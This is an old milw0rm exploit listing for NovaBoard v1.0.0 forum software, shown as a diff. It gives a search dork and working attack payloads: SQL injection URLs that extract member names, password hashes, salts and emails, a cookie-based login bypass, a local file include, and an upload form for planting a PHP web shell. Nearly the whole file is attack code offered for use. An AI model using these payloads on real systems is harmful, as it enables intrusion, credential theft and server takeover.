@@ -1,0 +1,68 @@
+===============================================================================================
+
+Found : brain[pillow]
+Dork  : "Powered by NovaBoard v1.0.0"
+Visit : brainpillow.cc, forum.antichat.ru, raz0r.name
+Mail  : brainpillow@gmail.com
+
+===============================================================================================
+
+-- [ blind sql-inj ]: 
+
+/index.php?page=search&search=xe&author_id=&author=&startdate=&enddate=&forums%5B%5D=&pf=1&topic=1'+union+select+1,2,3,4,5,6,7,8,9+from+novaboard_posts+where+1='2
+
+Need: magic quotes = off
+
+===============================================================================================
+
+-- [ standart sql-inj ]:
+
+/index.php?forum=2'+union+select+1,2,concat_ws('%20|%20',name,password,pass_salt,email)+from+novaboard_members+where+1='1
+
+Need: magic quotes = off
+Note: $password= md5($password . $pass_salt);
+
+===============================================================================================
+
+-- [ sql-inj in auth ]:
+
+COOKIES: nova_name=admin'#; nova_password=1c20a3e48e3b6607fedded430a20f606
+
+Need:   magic quotes = off
+
+===============================================================================================
+
+-- [ local include ]:
+
+/uploads/upload.php
+Cookie: nova_lang=../index.php%00
+
+Need:   1) no cookie "nova_name" in your browser.
+        2) magic quotes = off
+
+===============================================================================================
+
+-- [ shell upload ]:
+
+<form enctype='multipart/form-data' method='post' 
+
+action='http://localhost/_BOARD_PATH_/uploads/uploader.php'>
+<input type='hidden' name='MAX_FILE_SIZE' value='100000000000' />
+<input type='hidden' name='topicid' value='' />
+<input type='hidden' name='member' value='' />
+<input type='hidden' name='attachtype' value='' />
+<input type='hidden' name='hash' value='31337' />
+<input type='hidden' name='attachtype' value='attachments' />
+<input type='file' name='uploadedfile'>
+<input type='submit' value='Upload' />
+</form>
+
+Note: Must upload file "shell.php.anything.rar" and then have fun here: 
+
+http://localhost/_BOARD_PATH_/uploads/attachments/31337shell.php.anything.rar
+
+Need: attachments allowed
+
+===============================================================================================
+
+# milw0rm.com [2009-02-16]
